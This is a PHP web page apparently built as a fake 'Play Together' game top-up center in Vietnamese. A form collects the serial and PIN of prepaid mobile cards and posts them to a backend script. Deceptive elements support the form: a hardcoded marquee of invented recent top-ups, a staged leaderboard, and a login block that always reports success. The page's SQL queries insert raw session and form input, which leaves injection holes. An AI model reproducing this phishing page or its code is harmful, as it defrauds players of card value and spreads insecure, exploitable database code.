<?php
include ('duchoang_config/config.php');
include ('duchoang_config/header.php');
?>
<!--- Tiêu Đề --->
<title>Nạp Đá Quý | <?php echo $duchoang_title; ?> - <?php echo $duchoang_name; ?></title>
  <?php
  if(!$_SESSION['user']){
  ?>
<div class="page-content">
    <div class="container">
        <img src="<?php echo $duchoang_banner; ?>" width="100%" alt="nạp thẻ play together">
        <div class="content-area card col-12">
            <div class="card-innr">
                <p><b><span style="color: #1c8eff;">Play Together – Topup Center</span></b></p>
                <p><b>Play Together – Gặp Gỡ Bạn Bè Khắp Năm Châu</b> - Vũ Trụ Ảo Với Những Người Bạn Trên Toàn Thế Giới Đã Đến - <b>Play Together</b> Sẽ Hiện Thực Hóa Ước Mơ Của Bạn, Giúp Bạn Thỏa Sức Giải Trí, Tham Gia Những Chuyến Đi Đặc Biệt, Đồng Thời Gặp Gỡ Những Người Bạn Mới Từ Khắp Nơi Trên Thế Giới.</p>
        <div class="content-area card col-12">
       <ul class="nav nav-tabs nav-tabs-line" role="tablist">
                    <li class="nav-item">
                        <a class="nav-link active show" data-toggle="tab" href="#nap-the-play-together"><span class="pay-title"><span class="pay-cur">Nạp thẻ Play Together</span></span></a>
                    </li>
                </ul>
<div class="tab-content" id="profile-details">
<div class="tab-pane fade active show" id="nap-the-play-together">
<div class="token-statistics card card-token height-auto col-12">
<div class="card-innr">
<div class="token-balance">
<div class="token-balance-text">
<h6 class="card-sub-title text-center"><span style="color: white;">Khuyễn Mãi Cực Hot! Tưng Bừng Tết Đến Xuân Về Trang Chủ Play Together Khuyến Mãi X2 Nạp Thẻ.</span>
</div>
</div>
</div>
 </div>          
     <marquee direction="left" style="background:white">
</i> <b>VJ3G-AAZL-LMYY</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>50,000đ </b></span> Cách đây 1 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>2LFD-WARL-LMGG</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>50,000đ </b></span> Cách Đây 1 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>SSAXINHH</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>50,000đ </b></span> Cách Đây 9 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>SSAXINHH</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>50,000đ </b></span> Cách Đây 11 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>HK4A-EBHL-LMYG</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>50,000đ </b></span> Cách Đây 13 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>YM4A-ABRL-LMYU</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>100,000đ </b></span> Cách Đây 14 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>AKAV-EDZL-LMGY</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>100,000đ </b></span> Cách Đây 22 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>Quảngcácon8</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>300,000đ </b></span> Cách Đây 25 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>QKDB-WA9L-LMYY</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>100,000đ </b></span> Cách Đây 26 Phút Trước<span style="margin-right: 40px"></span>
</i> <b>SSAXINHH</b> Vừa Nạp Thành Công <span style="color:#9c27b0"><b>200,000đ </b></span> Cách Đây 28 Phút Trước<span style="margin-right: 40px"></span>
</marquee>
                       <div class="form-thanh-toan">
                        <div class="row">
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">ID Game | Tên Nhân Vật Play Together</label>
                                <input name="tentk" id="idgame" class="input-bordered" type="text" placeholder="Nhập Tên Nhân Vật Hoặc ID Game Của Bạn">
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Loại Thẻ</label>
                                       <select name="card_type" id="card_type" class="form-control">
                                                  <option value="">- Chọn Loại Thẻ -</option>
                               <option value="Viettel">Viettel</option>
                               <option value="Mobifone">Mobifone</option>
                               <option value="Vinaphone">Vinaphone</option>
                                                </select>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Mệnh Giá ( Chọn Sai Mệnh Giá Mất Thẻ )</label>
                                <select name="card_amount" id="card_amount" class="form-control">
                                                    <option value="">Chọn Mệnh Giá</option>
                                                    <option value="50000">50,000 VND - Nhận Thêm 15 Đá Quý</option>
                                                     <option value="100000">100,000 VND - Nhận Thêm 35 Đá Quý</option>
                                                      <option value="200000">200,000 VND - Nhận Thêm 55 Đá Quý</option>
                                                       <option value="500000">500,000 VND - Nhận Thêm 85 Đá Quý</option>
                                                       <option value="1000000">1,000,000 VND - Nhận Thêm 115 Đá Quý</option>
                                                </select>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Mã Số Seri Thẻ</label>
                                <input name="serial" id="serial" class="input-bordered" type="number" placeholder="Nhập Số Seri">
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Mã Số Thẻ</label>
                                <input name="pin" id="pin" class="input-bordered" type="number" placeholder="Nhập Mã Thẻ">
                            </div>
                        </div>
                        <input type="text" hidden class="form-control" name="game" >
                         <input type="text" hidden class="form-control" name="website" >
                         <input type="text" hidden class="form-control" name="gc" >
                        <div class="col-md-12"><div class="kqn" style="margin:10px 0px;"></div>
                            <button style="width: 100%;" type="submit" class="btn btn-primary" onclick="huy_click()" id="loading_napthe">NẠP THẺ</button>
                            <div id="loading_napthe" class="text-center" style="display: none;"><img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" /><br>Vui Lòng Chờ...</div>
                        </div>
                        </div>
                         <script>
                                    function huy_click() {
                                        var card_type = $("#card_type").val();
                                        var card_amount = $("#card_amount").val();
                                        var serial = $("#serial").val();
                                        var pin = $("#pin").val();
                                        var idgame = $("#idgame").val();

                                        if (!card_type || !card_amount || !serial || !pin || !idgame) {
                                            swal("Có Lỗi Xảy Ra", "Vui Lòng Điền Đầy Đủ Thông Tin Bao Gồm Seri Mã Thẻ Và ID Game Của Bạn", "error");
                                        } else {
                                            $.ajax({
                                                type: "POST",
                                                url: "ajax.php",
                                                data: {
                                                    card_type,
                                                    card_amount,
                                                    serial,
                                                    pin,
                                                },
                                                dataType: "json",
                                                success: function (res) {
                                                    if (res.success) {
                                                        swal("Thành Công", res.success, "success");
                                                    } else {
                                                        swal("Lỗi", res.error, "error");
                                                    }
                                                },
                                                error: function (err) {
                                                    console.log(err);
                                                },
                                            });
                                        }
                                    }
                                  </script>
                                  
                    <br>
                  
</script>
</div></center>
<br /><br>
                        <table class="table table-bordered">
                    <thead>
                <tr>
                <th scope="col">Mệnh Giá</th>
                <th scope="col">Nhận&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
                </tr>
                    </thead>
                    <tbody>
            <td><b>50.000 VNĐ</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 150 + 15<br> 
                </tr>
                <tr>
            <td><b>100.000 VNĐ</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 310 + 35<br> 
                </tr>
                <tr>
            <td><b>200.000 VNĐ</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 550 + 55<br>
                </tr>
                <tr>
            <td><b>500.000 VNĐ</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 680 + 85<br> 
                </tr>
                 <tr>
            <td><b>1.000.000 VNĐ</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 900 + 115<br>
                </tr>
                    </tbody>
</div>
  <center> <table class="table table-bordered">
                    <thead>
                <tr>
                <th scope="col">TOP</th>
                <th scope="col">SỐ <img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
                </tr>
                    </thead>
                    <tbody>
                 <td><b>1. Lão Gió</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/>48.300<br> 
                </tr>
                <tr>
                 <td><b>2. Trải Nghiệm Game</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 37.920<br> 
                </tr>
                <tr>
            <td><b>3. GilGaming TV</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 32.650<br> 
                </tr>
                <tr>
            <td><b>4. Meow Nhân Phẩm</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 29.879<br> 
                </tr>
                <tr>
            <td><b>5. AnhEm TV</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 28.950<br>
                </tr>
                <tr>
            <td><b>6. Kietdepzai</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 23.030<br> 
                </tr>
            <td><b>7. Gakuteee</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 17.620<br> 
                </tr>
                
            <td><b>8. Karos TV</b></td>
            <td><b><img src="<?php echo $duchoang_daquy;?>" width="30" alt="đá quý"/> 14.640<br> 
                </tr>
                    </tbody>
                    
                        </table></center>
<?php }else{ ?> 
<?php } ?>
<?php
$taikhoan = mysqli_fetch_array(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '".$_SESSION['user']."'"));
    if(isset($_POST['dangnhap'])){
      $taikhoan = $_POST['taikhoan'];
      echo '<meta http-equiv="refresh" content="1;url=/loading.php?=connecting">';
          if(strlen($taikhoan) < 14 || strlen($taikhoan) > 14){
         echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
          }else{
          $kiemtra = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '$taikhoan' "));
            $save = mysqli_query($connect,
                  "INSERT INTO `user` (`id`, `taikhoan`) VALUES (NULL, '$taikhoan')");
 echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
                    $_SESSION['user'] = $taikhoan;

                    }
                  }
                    ?>
<?php
include ('duchoang_config/footer.php');
?>